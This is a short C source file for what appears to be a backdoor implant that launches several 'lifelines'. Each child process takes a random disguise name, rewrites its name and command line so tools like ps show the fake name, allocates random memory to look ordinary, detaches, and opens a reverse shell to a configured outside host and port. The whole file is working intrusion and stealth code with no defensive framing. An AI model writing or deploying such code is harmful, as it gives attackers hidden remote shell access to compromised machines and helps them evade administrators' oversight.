#define _GNU_SOURCE

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/prctl.h>
#include <unistd.h>

#include "constants.h"
#include "reverse.h"

void dispatch(int argc, char *argv[]) {
    // Pick a random process name
    unsigned int upper = sizeof(process_names) / sizeof(process_names[0]);
    unsigned int r = rand() % upper;
    const char *name = process_names[r];

    // Change our process name
    // https://stackoverflow.com/questions/6082189/change-process-name-in-linux
    pthread_setname_np(pthread_self(), name);
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);

    // Change the Commandline seen in ps
    unsigned long length = MAX(strlen(argv[0]), strlen(name));
    for (unsigned int i = 0; i < length; i++) {
        if (i < strlen(name)) {
            argv[0][i] = name[i];
        } else {
            argv[0][i] = 0x00;
        }
    }

    unsigned int pid = fork();
    // The parent process should return to main
    if (pid != 0) {
        return;
    }

    // Literally malloc some random data. Ensures memory usage looks somewhat random
    unsigned int amount = rand() % 10000000; // up to 10MB
    malloc(amount);

    // Get a reverse shell going
    reverse_shell(HOST, PORT, 1);
}

int main(int argc, char *argv[]) {
    srand(time(NULL));
    int number_of_listeners = 1;
    if (argc > 1) {
        sscanf(argv[1], "%d", &number_of_listeners);
    }
    printf("Starting %d lifelines\n", number_of_listeners);

    // Close stdout and stderr, so our callee receives an EOF.
    // Especially useful when starting additional lifeline from a lifeline
    fclose(stdout);
    fclose(stderr);
    for (int i = 0; i < number_of_listeners; i++) {
        dispatch(argc, argv);
        usleep(10000); // short sleep to mitigate race conditions when checking /proc/net/tcp
    }

    // The parent can exit, we want the rest of our program to be detached
    pthread_exit(0);
}
